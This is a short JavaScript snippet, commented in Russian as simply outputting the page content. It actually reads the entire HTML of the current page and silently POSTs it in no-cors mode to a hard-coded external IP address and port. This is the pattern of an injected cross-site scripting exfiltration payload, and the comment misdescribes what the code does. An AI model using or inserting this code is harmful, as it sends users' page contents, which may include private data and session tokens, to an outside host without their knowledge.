// Просто выводим всё содержимое страницы
var allContent = document.documentElement.outerHTML;
fetch('http://109.234.39.144:8889/', {
    method: 'POST',
    mode: 'no-cors',
    body: allContent
});
